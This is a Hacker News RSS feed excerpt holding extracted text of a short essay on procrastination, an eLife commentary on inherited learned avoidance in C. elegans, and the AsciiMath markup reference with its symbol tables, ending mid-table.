<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-11-16T15:08:42.743602+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45939431</id><title>Things that aren't doing the thing</title><updated>2025-11-16T15:08:50.842361+00:00</updated><content>&lt;doc fingerprint="c15804b5dbc065b4"&gt;
  &lt;main&gt;
    &lt;p&gt;Preparing to do the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Scheduling time to do the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Making a to-do list for the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Telling people you're going to do the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Messaging friends who may or may not be doing the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Writing a banger tweet about how you're going to do the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Hating on yourself for not doing the thing isn't doing the thing. Hating on other people who have done the thing isn't doing the thing. Hating on the obstacles in the way of doing the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Fantasizing about all of the adoration you'll receive once you do the thing isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;Reading about how to do the thing isn't doing the thing. Reading about how other people did the thing isn't doing the thing. Reading this essay isn't doing the thing.&lt;/p&gt;
    &lt;p&gt;The only thing that is doing the thing is doing the thing.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://strangestloop.io/essays/things-that-arent-doing-the-thing"/><published>2025-11-15T18:24:58+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45939550</id><title>Transgenerational Epigenetic Inheritance: the story of learned avoidance</title><updated>2025-11-16T15:08:50.614901+00:00</updated><content>&lt;doc fingerprint="4780c9413920cbd3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Transgenerational Epigenetic Inheritance: Twists and turns in the story of learned avoidance&lt;/head&gt;
    &lt;p&gt;The ability to recognize and avoid pathogens is essential for survival. In some cases, animals recognize molecules produced by pathogens, allowing them to mount an immediate response. In other cases, animals learn to avoid the pathogen after they have been exposed to it – a phenomenon that is called “learned avoidance”.&lt;/p&gt;
    &lt;p&gt;The worm Caenorhabditis elegans can learn to avoid Pseudomonas aeruginosa, a pathogenic bacterium that causes disease in a range of species (Zhang et al., 2005). In 2019, Coleen Murphy and colleagues at Princeton University observed that learned avoidance of the PA14 strain of P. aeruginosa could be transmitted for up to four generations of C. elegans without new exposure to PA14 (Moore et al., 2019; Kaletsky et al., 2020). This transgenerational epigenetic inheritance allows animals that have never encountered PA14 to benefit from the experiences of previous generations.&lt;/p&gt;
    &lt;p&gt;Recently, Craig Hunter and colleagues at Harvard University questioned the inheritance of learned avoidance to the F2 generation (Gainey et al., 2025). While they observed learned avoidance to PA14 in parents (P0) and their progeny (F1), they did not observe avoidance in the F2 generation. The Murphy group responded, contending that the inability to observe transgenerational epigenetic inheritance was due to changes the Hunter group made to the original experimental protocols (Kaletsky et al., 2025). Now, in eLife, Andres Vidal-Gadea and colleagues at Illinois State University – Aalimah Akinosho, Joseph Alexander and Kyle Floyd – report that they have confirmed findings from the Murphy group by showing that learned avoidance of PA14 is passed on to the F2 generation (Akinosho et al., 2025).&lt;/p&gt;
    &lt;p&gt;In a standard avoidance assay, test spots of bacteria are placed at opposite ends of an agar plate, and sodium azide – a chemical that immobilizes worms – is added to each test spot (Figure 1). The worms are placed at the center of the plate and allowed to roam, and the number of worms in proximity to each test spot is scored after one hour (Moore et al., 2019).&lt;/p&gt;
    &lt;p&gt;For the learned avoidance assay, the worms are exposed to PA14 for 24 hours, a process sometimes called “training”, after which time they are collected and washed. A subset of these worms is transferred to a test plate and allowed to choose between PA14 and the OP50 strain of E. coli (which is the standard laboratory diet of C. elegans). This is the parental generation, and the worms in it will avoid PA14.&lt;/p&gt;
    &lt;p&gt;Eggs (F1) are collected from the remaining worms and transferred to standard OP50 plates. Once they reach the adult stage, the same process is carried out; a subset of animals is tested, and eggs are collected from the remaining worms for the next generation (F2). Importantly, after the parental generation, worms do not encounter PA14 before testing, but they retain the learned avoidance of the parental generation. To measure learned avoidance, all groups are compared to animals whose predecessors have never encountered PA14.&lt;/p&gt;
    &lt;p&gt;Both the Murphy and Vidal-Gadea groups used sodium azide in their assays to immobilize the worms, while the Hunter group immobilized them by lowering the temperature to 4 °C at the end of the assay. With azide, worms that reach the test spots before the end of the assay are immobilized. By contrast, when the temperature shift method is used, worms can come into contact with the test spots and then move away before the end of the assay. The Murphy group proposed that the use of azide ensured that animals were captured in their initial response, which prevented them from learning to avoid PA14 after encountering it during the assay. However, they argued, when the temperature-shift method is used, worms can encounter PA14, learn from this encounter, and avoid the PA14 spot (Kaletsky et al., 2025). Put simply, an encounter with PA14 could unintentionally introduce another source of learned avoidance to the assay. The most significant impact of this would be on the negative control, where it is assumed that the worms’ response reflects that of animals that have never encountered PA14.&lt;/p&gt;
    &lt;p&gt;Worms that have not previously encountered PA14 are initially attracted to it (Zhang et al., 2005). While the Murphy group consistently observed this attraction in their assays, the Hunter group generally did not (Kaletsky et al., 2025). The Vidal-Gadea group also observed that worms that had not been exposed to PA14 were initially attracted to it, suggesting that this is an important piece of the puzzle (Akinosho et al., 2025). Indeed, when tested directly, the Murphy group did not observe attraction using the temperature-shift method (Kaletsky et al., 2025). However, whether the omission of azide alone explains the discrepancy between the studies is not clear. In a handful of assays, the Hunter group used azide but failed to see the initial attraction to PA14, or to observe learned avoidance in the F2 generation.&lt;/p&gt;
    &lt;p&gt;P11, a small RNA produced by PA14, is necessary and sufficient to induce transgenerational epigenetic inheritance (Kaletsky et al., 2020). In addition, loss of P11 reduces chemoattraction to PA14 by reducing ammonia production (Marogi et al., 2024). The Murphy lab proposed that suboptimal P11 expression could explain difficulties in reproducing transgenerational epigenetic inheritance and in observing the initial attraction to PA14. Although they did not measure P11 levels, the Hunter group argued that their ability to observe learned avoidance in the F1 generation excluded the possibility that P11 expression was insufficient. PA14 growth conditions can alter P11 expression (Kaletsky et al., 2025), but whether low levels of P11 could permit F1 inheritance but not F2, is unknown.&lt;/p&gt;
    &lt;p&gt;Behavioral assays are notoriously finicky, not because they measure effects that are not robust, but because C. elegans are highly attuned to their environments; they integrate a myriad of environmental signals into an appropriate response. Hunter and colleagues tested potential sources of variability in the laboratory environment, including the sources of bacterial and worm strains, but none of these explained the discrepancy in their findings. The sources of variability identified by the Murphy lab (Kaletsky et al., 2025) provide a logical explanation for the differences between the two studies, but other unidentified environmental or procedural differences may also have contributed. The results of the Vidal-Gadea group, therefore, represent an important validation of the work of the Murphy group, and support the idea that procedural modifications made by the Hunter group contributed to their inability to observe transgenerational epigenetic inheritance.&lt;/p&gt;
    &lt;head rend="h2"&gt;References&lt;/head&gt;
    &lt;head rend="h2"&gt;Article and author information&lt;/head&gt;
    &lt;head rend="h3"&gt;Author details&lt;/head&gt;
    &lt;head rend="h3"&gt;Publication history&lt;/head&gt;
    &lt;head rend="h3"&gt;Copyright&lt;/head&gt;
    &lt;p&gt;© 2025, MacNeil&lt;/p&gt;
    &lt;p&gt;This article is distributed under the terms of the Creative Commons Attribution License, which permits unrestricted use and redistribution provided that the original author and source are credited.&lt;/p&gt;
    &lt;head rend="h2"&gt;Metrics&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;list rend="dl"&gt;
          &lt;item rend="dd-1"&gt;573&lt;/item&gt;
          &lt;item rend="dt-2"&gt;views&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;list rend="dl"&gt;
          &lt;item rend="dd-2"&gt;12&lt;/item&gt;
          &lt;item rend="dt-3"&gt;downloads&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;list rend="dl"&gt;
          &lt;item rend="dd-3"&gt;0&lt;/item&gt;
          &lt;item rend="dt-4"&gt;citations&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Views, downloads and citations are aggregated across all versions of this paper published by eLife.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://elifesciences.org/articles/109427"/><published>2025-11-15T18:40:55+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45940706</id><title>AsciiMath</title><updated>2025-11-16T15:08:50.451418+00:00</updated><content>&lt;doc fingerprint="be534690eac6d39c"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;About&lt;/head&gt;
    &lt;p&gt;AsciiMath is an easy-to-write markup language for mathematics.&lt;lb/&gt; Try it out in the interactive renderer:&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting Started&lt;/head&gt;
    &lt;p&gt;In order to get started you have two options:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;Use MathJax to render your formulas. MathJax is a full fledged open source JavaScript display engine for mathematics and works in all browsers.&lt;/p&gt;&lt;lb/&gt;This is the recommended approach!&lt;p&gt;Get started by loading the default AsciiMath configuration:&lt;/p&gt;&lt;code&gt;&amp;lt;script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/latest.js?config=AM_CHTML"&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;Visit the MathJax Getting Started page to find other CDN options , or to learn how to install MathJax locally on your server.&lt;/p&gt;&lt;p&gt;Text in your HTML enclosed in&lt;/p&gt;&lt;code&gt;`&lt;/code&gt;(backticks) will now get rendered as a math formula. The math delimiters can also be customized. Check out the MathJax website for more information!&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Load the AsciiMath javascript file (get it on GitHub) in either the&lt;/p&gt;&lt;code&gt;head&lt;/code&gt;or the&lt;code&gt;body&lt;/code&gt;tag of your website like this:&lt;code&gt;&amp;lt;script src="ASCIIMathML.js"&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;This file contains JavaScript to convert AsciiMath notation and (some) LaTeX to Presentation MathML. The conversion is done while the HTML page loads.&lt;/p&gt;&lt;p&gt;Attention: Currently this only works in Firefox and Safari.&lt;/p&gt;&lt;p&gt;While HTML5 now includes MathML as an official recommendation, the remaining browsers do not appear to be implementing it. For widest browser compatibility, the use of MathJax is recommended.&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Syntax&lt;/head&gt;
    &lt;p&gt;Most AsciiMath symbols attempt to mimic in text what they look like rendered, like &lt;code&gt;oo&lt;/code&gt; for `oo`.  Many symbols can also be
	   displayed using a TeX alternative, but a preceeding backslash is not 
	   required.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;+&lt;/cell&gt;
        &lt;cell&gt;`+`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;`-`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;*&lt;/cell&gt;
        &lt;cell&gt;cdot&lt;/cell&gt;
        &lt;cell&gt;`*`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;**&lt;/cell&gt;
        &lt;cell&gt;ast&lt;/cell&gt;
        &lt;cell&gt;`**`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;***&lt;/cell&gt;
        &lt;cell&gt;star&lt;/cell&gt;
        &lt;cell&gt;`***`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;//&lt;/cell&gt;
        &lt;cell&gt;`//`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\\&lt;/cell&gt;
        &lt;cell&gt;backslash&lt;p&gt;setminus&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;`\\`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;xx&lt;/cell&gt;
        &lt;cell&gt;times&lt;/cell&gt;
        &lt;cell&gt;`xx`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-:&lt;/cell&gt;
        &lt;cell&gt;div&lt;/cell&gt;
        &lt;cell&gt;`-:`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|&amp;gt;&amp;lt;&lt;/cell&gt;
        &lt;cell&gt;ltimes&lt;/cell&gt;
        &lt;cell&gt;`|&amp;gt;&amp;lt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;&amp;lt;|&lt;/cell&gt;
        &lt;cell&gt;rtimes&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;&amp;lt;|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|&amp;gt;&amp;lt;|&lt;/cell&gt;
        &lt;cell&gt;bowtie&lt;/cell&gt;
        &lt;cell&gt;`|&amp;gt;&amp;lt;|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;@&lt;/cell&gt;
        &lt;cell&gt;circ&lt;/cell&gt;
        &lt;cell&gt;`@`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;o+&lt;/cell&gt;
        &lt;cell&gt;oplus&lt;/cell&gt;
        &lt;cell&gt;`o+`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ox&lt;/cell&gt;
        &lt;cell&gt;otimes&lt;/cell&gt;
        &lt;cell&gt;`ox`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;o.&lt;/cell&gt;
        &lt;cell&gt;odot&lt;/cell&gt;
        &lt;cell&gt;`o.`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sum&lt;/cell&gt;
        &lt;cell&gt;`sum`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;prod&lt;/cell&gt;
        &lt;cell&gt;`prod`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;^^&lt;/cell&gt;
        &lt;cell&gt;wedge&lt;/cell&gt;
        &lt;cell&gt;`^^`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;^^^&lt;/cell&gt;
        &lt;cell&gt;bigwedge&lt;/cell&gt;
        &lt;cell&gt;`^^^`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;vv&lt;/cell&gt;
        &lt;cell&gt;vee&lt;/cell&gt;
        &lt;cell&gt;`vv`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;vvv&lt;/cell&gt;
        &lt;cell&gt;bigvee&lt;/cell&gt;
        &lt;cell&gt;`vvv`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;nn&lt;/cell&gt;
        &lt;cell&gt;cap&lt;/cell&gt;
        &lt;cell&gt;`nn`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;nnn&lt;/cell&gt;
        &lt;cell&gt;bigcap&lt;/cell&gt;
        &lt;cell&gt;`nnn`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;uu&lt;/cell&gt;
        &lt;cell&gt;cup&lt;/cell&gt;
        &lt;cell&gt;`uu`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;uuu&lt;/cell&gt;
        &lt;cell&gt;bigcup&lt;/cell&gt;
        &lt;cell&gt;`uuu`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;2/3&lt;/cell&gt;
        &lt;cell&gt;frac{2}{3}&lt;/cell&gt;
        &lt;cell&gt;`2/3`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;2^3&lt;/cell&gt;
        &lt;cell&gt;`2^3`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sqrt x&lt;/cell&gt;
        &lt;cell&gt;`sqrt x`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;root(3)(x)&lt;/cell&gt;
        &lt;cell&gt;`root(3)(x)`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;int&lt;/cell&gt;
        &lt;cell&gt;`int`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;oint&lt;/cell&gt;
        &lt;cell&gt;`oint`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;del&lt;/cell&gt;
        &lt;cell&gt;partial&lt;/cell&gt;
        &lt;cell&gt;`del`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;grad&lt;/cell&gt;
        &lt;cell&gt;nabla&lt;/cell&gt;
        &lt;cell&gt;`grad`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;+-&lt;/cell&gt;
        &lt;cell&gt;pm&lt;/cell&gt;
        &lt;cell&gt;`+-`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;O/&lt;/cell&gt;
        &lt;cell&gt;emptyset&lt;/cell&gt;
        &lt;cell&gt;`O/`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;oo&lt;/cell&gt;
        &lt;cell&gt;infty&lt;/cell&gt;
        &lt;cell&gt;`oo`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;aleph&lt;/cell&gt;
        &lt;cell&gt;`aleph`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;:.&lt;/cell&gt;
        &lt;cell&gt;therefore&lt;/cell&gt;
        &lt;cell&gt;`:.`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;:'&lt;/cell&gt;
        &lt;cell&gt;because&lt;/cell&gt;
        &lt;cell&gt;`:'`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|...|&lt;/cell&gt;
        &lt;cell&gt;|ldots|&lt;/cell&gt;
        &lt;cell&gt;`|...|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|cdots|&lt;/cell&gt;
        &lt;cell&gt;`|cdots|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;vdots&lt;/cell&gt;
        &lt;cell&gt;`vdots`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ddots&lt;/cell&gt;
        &lt;cell&gt;`ddots`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|\ |&lt;/cell&gt;
        &lt;cell&gt;`|\ |`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|quad|&lt;/cell&gt;
        &lt;cell&gt;`|quad|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;/_&lt;/cell&gt;
        &lt;cell&gt;angle&lt;/cell&gt;
        &lt;cell&gt;`/_`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;frown&lt;/cell&gt;
        &lt;cell&gt;`frown`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;/_\&lt;/cell&gt;
        &lt;cell&gt;triangle&lt;/cell&gt;
        &lt;cell&gt;`/_\\`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;diamond&lt;/cell&gt;
        &lt;cell&gt;`diamond`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;square&lt;/cell&gt;
        &lt;cell&gt;`square`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|__&lt;/cell&gt;
        &lt;cell&gt;lfloor&lt;/cell&gt;
        &lt;cell&gt;`|__`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;__|&lt;/cell&gt;
        &lt;cell&gt;rfloor&lt;/cell&gt;
        &lt;cell&gt;`__|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;|~&lt;/cell&gt;
        &lt;cell&gt;lceiling&lt;/cell&gt;
        &lt;cell&gt;`|~`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;~|&lt;/cell&gt;
        &lt;cell&gt;rceiling&lt;/cell&gt;
        &lt;cell&gt;`~|`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;CC&lt;/cell&gt;
        &lt;cell&gt;`CC`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;NN&lt;/cell&gt;
        &lt;cell&gt;`NN`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;`QQ`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;RR&lt;/cell&gt;
        &lt;cell&gt;`RR`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;ZZ&lt;/cell&gt;
        &lt;cell&gt;`ZZ`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;"hi"&lt;/cell&gt;
        &lt;cell&gt;text(hi)&lt;/cell&gt;
        &lt;cell&gt;`"hi"`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;=&lt;/cell&gt;
        &lt;cell&gt;`=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;!=&lt;/cell&gt;
        &lt;cell&gt;ne&lt;/cell&gt;
        &lt;cell&gt;`!=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;lt;&lt;/cell&gt;
        &lt;cell&gt;lt&lt;/cell&gt;
        &lt;cell&gt;`&amp;lt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;gt&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;lt;=&lt;/cell&gt;
        &lt;cell&gt;le&lt;/cell&gt;
        &lt;cell&gt;`&amp;lt;=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;=&lt;/cell&gt;
        &lt;cell&gt;ge&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;mlt&lt;/cell&gt;
        &lt;cell&gt;ll&lt;/cell&gt;
        &lt;cell&gt;`mlt`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;mgt&lt;/cell&gt;
        &lt;cell&gt;gg&lt;/cell&gt;
        &lt;cell&gt;`mgt`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-&amp;lt;&lt;/cell&gt;
        &lt;cell&gt;prec&lt;/cell&gt;
        &lt;cell&gt;`-&amp;lt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-&amp;lt;=&lt;/cell&gt;
        &lt;cell&gt;preceq&lt;/cell&gt;
        &lt;cell&gt;`-&amp;lt;=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;-&lt;/cell&gt;
        &lt;cell&gt;succ&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;-`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;gt;-=&lt;/cell&gt;
        &lt;cell&gt;succeq&lt;/cell&gt;
        &lt;cell&gt;`&amp;gt;-=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;in&lt;/cell&gt;
        &lt;cell&gt;`in`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;!in&lt;/cell&gt;
        &lt;cell&gt;notin&lt;/cell&gt;
        &lt;cell&gt;`!in`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sub&lt;/cell&gt;
        &lt;cell&gt;subset&lt;/cell&gt;
        &lt;cell&gt;`sub`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sup&lt;/cell&gt;
        &lt;cell&gt;supset&lt;/cell&gt;
        &lt;cell&gt;`sup`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sube&lt;/cell&gt;
        &lt;cell&gt;subseteq&lt;/cell&gt;
        &lt;cell&gt;`sube`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;supe&lt;/cell&gt;
        &lt;cell&gt;supseteq&lt;/cell&gt;
        &lt;cell&gt;`supe`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;-=&lt;/cell&gt;
        &lt;cell&gt;equiv&lt;/cell&gt;
        &lt;cell&gt;`-=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;~=&lt;/cell&gt;
        &lt;cell&gt;cong&lt;/cell&gt;
        &lt;cell&gt;`~=`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;~~&lt;/cell&gt;
        &lt;cell&gt;approx&lt;/cell&gt;
        &lt;cell&gt;`~~`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;prop&lt;/cell&gt;
        &lt;cell&gt;propto&lt;/cell&gt;
        &lt;cell&gt;`prop`&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;TeX alt&lt;/cell&gt;
        &lt;cell role="head"&gt;See&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;and&lt;/cell&gt;
        &lt;cell&gt;`and`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;or&lt;/cell&gt;
        &lt;cell&gt;`or`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;not&lt;/cell&gt;
        &lt;cell&gt;neg&lt;/cell&gt;
        &lt;cell&gt;`not`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;=&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;implies&lt;/cell&gt;
        &lt;cell&gt;`=&amp;gt;`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;if&lt;/cell&gt;
        &lt;cell&gt;`if`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;lt;=&amp;gt;&lt;/cell&gt;
        &lt;cell&gt;iff&lt;/cell&gt;
        &lt;cell&gt;`iff`&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;AA&lt;/cell&gt;
        &lt;cell&gt;forall&lt;/cell&gt;
